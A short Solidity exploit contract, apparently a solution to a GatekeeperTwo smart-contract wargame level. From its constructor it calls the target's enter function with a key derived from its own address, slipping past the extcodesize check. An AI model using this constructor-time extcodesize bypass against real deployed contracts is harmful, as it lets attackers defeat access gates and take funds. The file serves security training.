pragma solidity ^0.8.10;

import "forge-std/Test.sol";

contract AttackGatekeeperTwo {
    address public victim;
    
    constructor(address _victim) {
        victim = _victim;
        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (type(uint64).max)); 
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
        (bool success,) = victim.call(payload);

        uint x;
        assembly { x := extcodesize(address()) }
        console.log("extcodesize at constructor is: %s",x);

        require(success, "failed");
    }

    function checkExtCode() public view returns(uint256) {
        uint x;
        assembly { x := extcodesize(address()) }
        console.log("extcodesize on a function is: %s",x);
        return x;
    }
}

